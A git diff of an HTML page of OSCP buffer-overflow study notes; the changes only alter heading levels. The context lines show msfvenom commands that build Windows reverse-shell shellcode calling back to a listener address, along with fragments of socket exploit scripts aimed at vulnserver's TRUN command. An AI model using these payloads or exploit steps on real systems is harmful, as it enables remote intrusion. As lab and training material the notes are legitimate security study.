@@ -173,7 +173,8 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="buffer-overflow"><a class="header" href="#buffer-overflow">Buffer Overflow</a></h1>
+                        <h2 id="buffer-overflow"><a class="header" href="#buffer-overflow">Buffer Overflow</a></h2>
+<h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="obsidian://open?vault=Obsidian%20Vault&amp;file=OSCP%2FRandom%20Notes%2FTib3rius%2FBuffer%20Overflow">Tib3rius</a></li>
 <li><a href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf">Justin Steve BufferOverflow</a></li>
@@ -181,7 +182,7 @@
 <li><a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst">Tib3rius BufferOverflow Github</a></li>
 <li><a href="https://github.com/3isenHeiM/OSCP-BoF">3isenHeim BufferOverflow GitHub</a></li>
 </ul>
-<h2 id="general-steps"><a class="header" href="#general-steps">General Steps</a></h2>
+<h3 id="general-steps"><a class="header" href="#general-steps">General Steps</a></h3>
 <pre><code>The Stack
 
 |-------------------------------------------------|
@@ -241,7 +242,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITF
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
 
 </code></pre>
-<h2 id="buffer-skeleton-program"><a class="header" href="#buffer-skeleton-program">Buffer Skeleton Program</a></h2>
+<h3 id="buffer-skeleton-program"><a class="header" href="#buffer-skeleton-program">Buffer Skeleton Program</a></h3>
 <pre><code>Buffer Over flow using Tib3rius Notes
 
 # Buffer Skeleton Script:
@@ -284,7 +285,7 @@ except:
 
 
 </code></pre>
-<h2 id="parameters-file"><a class="header" href="#parameters-file">Parameters File</a></h2>
+<h3 id="parameters-file"><a class="header" href="#parameters-file">Parameters File</a></h3>
 <pre><code># PARAMETERS.py
 # This is the files with all the variables
 # This has been designed for the OSCP buffer overflow machine
@@ -316,7 +317,7 @@ sub_esp_10 = b"\x83\xec\x10"
 
 
 </code></pre>
-<h2 id="create-bad-chars-file"><a class="header" href="#create-bad-chars-file">Create Bad Chars File</a></h2>
+<h3 id="create-bad-chars-file"><a class="header" href="#create-bad-chars-file">Create Bad Chars File</a></h3>
 <pre><code>#!/usr/bin/env python
 from __future__ import print_function
 
@@ -326,7 +327,7 @@ for x in range(1, 256):
 print()
 
 </code></pre>
-<h2 id="quasi-auto-fuzzer"><a class="header" href="#quasi-auto-fuzzer">Quasi Auto Fuzzer</a></h2>
+<h3 id="quasi-auto-fuzzer"><a class="header" href="#quasi-auto-fuzzer">Quasi Auto Fuzzer</a></h3>
 <pre><code>
 # Fuzzer.py
 
@@ -353,7 +354,7 @@ while True:
 
 
 </code></pre>
-<h2 id="tryhackme-fuzzer"><a class="header" href="#tryhackme-fuzzer">TryHackMe Fuzzer</a></h2>
+<h3 id="tryhackme-fuzzer"><a class="header" href="#tryhackme-fuzzer">TryHackMe Fuzzer</a></h3>
 <pre><code>#!/usr/bin/env python3
 
 import socket, time, sys
@@ -383,7 +384,7 @@ while True:
 
 
 </code></pre>
-<h2 id="tryhackme-exploit-code"><a class="header" href="#tryhackme-exploit-code">TryHackMe Exploit Code</a></h2>
+<h3 id="tryhackme-exploit-code"><a class="header" href="#tryhackme-exploit-code">TryHackMe Exploit Code</a></h3>
 <pre><code>import socket
 
 ip = "10.10.84.48"
@@ -411,7 +412,7 @@ except:
 
 
 </code></pre>
-<h2 id="1-trigger-bug"><a class="header" href="#1-trigger-bug">1 Trigger Bug</a></h2>
+<h3 id="1-trigger-bug"><a class="header" href="#1-trigger-bug">1 Trigger Bug</a></h3>
 <pre><code>
  #!/usr/bin/env python2
 import socket
@@ -428,7 +429,7 @@ s.send(buf)
 
 
 </code></pre>
-<h2 id="2-find-offset"><a class="header" href="#2-find-offset">2 Find Offset</a></h2>
+<h3 id="2-find-offset"><a class="header" href="#2-find-offset">2 Find Offset</a></h3>
 <pre><code>#!/usr/bin/env python2
 
 #msf-pattern_create -l 1024
@@ -451,7 +452,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="3-confirm-offset"><a class="header" href="#3-confirm-offset">3 Confirm Offset</a></h2>
+<h3 id="3-confirm-offset"><a class="header" href="#3-confirm-offset">3 Confirm Offset</a></h3>
 <pre><code>#!/usr/bin/env python2
 import socket
 
@@ -474,7 +475,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="4-find-bad-chars"><a class="header" href="#4-find-bad-chars">4 Find Bad Chars</a></h2>
+<h3 id="4-find-bad-chars"><a class="header" href="#4-find-bad-chars">4 Find Bad Chars</a></h3>
 <pre><code>
 #!/usr/bin/env python2
 
@@ -513,7 +514,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="5-the-jmp"><a class="header" href="#5-the-jmp">5 The JMP</a></h2>
+<h3 id="5-the-jmp"><a class="header" href="#5-the-jmp">5 The JMP</a></h3>
 <pre><code>
 #!/usr/bin/env python2
 import socket
@@ -542,7 +543,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="6-pop-calc"><a class="header" href="#6-pop-calc">6 Pop Calc</a></h2>
+<h3 id="6-pop-calc"><a class="header" href="#6-pop-calc">6 Pop Calc</a></h3>
 <pre><code>#!/usr/bin/env python2
 import socket
 import struct
@@ -600,7 +601,7 @@ s.send(buf)
 
 
 </code></pre>
-<h2 id="7-pop-shell"><a class="header" href="#7-pop-shell">7 Pop Shell</a></h2>
+<h3 id="7-pop-shell"><a class="header" href="#7-pop-shell">7 Pop Shell</a></h3>
 <pre><code>
 #!/usr/bin/env python2
 import socket
@@ -662,7 +663,7 @@ s.send('TRUN /.:/'+buf)
 
 
 </code></pre>
-<h2 id="smash-the-stack-notes"><a class="header" href="#smash-the-stack-notes">Smash The Stack Notes</a></h2>
+<h3 id="smash-the-stack-notes"><a class="header" href="#smash-the-stack-notes">Smash The Stack Notes</a></h3>
 <pre><code>
 void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   int *ret;   ret = buffer1 + 12;   (*ret) += 8; } void main() {  int x;  x = 0;  function(1,2,3);  x = 1;  printf("%d\n",x); }
 
